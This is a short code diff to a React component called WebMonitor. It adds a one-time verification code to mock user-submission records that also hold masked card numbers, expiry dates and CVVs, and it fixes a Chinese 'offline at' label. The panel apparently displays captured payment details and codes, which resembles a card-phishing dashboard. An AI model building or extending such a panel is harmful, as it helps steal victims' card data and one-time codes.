@@ -166,7 +166,8 @@ const submissionData: UserSubmission[] = [
       phone: "189****9876",
       cardNumber: "5555 **** **** 4444",
       expiryDate: "08/25",
-      cvv: "***"
+      cvv: "***",
+      verificationCode: "5812"
     },
     submitCount: 5,
     submitHistory: [
@@ -376,7 +377,7 @@ export function WebMonitor() {
                   {submission.isOffline && submission.offlineTime && (
                     <div className="flex items-center gap-1">
                       <span className="text-sm font-medium border border-red-300/50 rounded px-2 py-1 bg-red-50/10 text-red-600">
-                        {getRelativeTime(submission.offlineTime, "离线���")}
+                        {getRelativeTime(submission.offlineTime, "离线于")}
                       </span>
                     </div>
                   )}
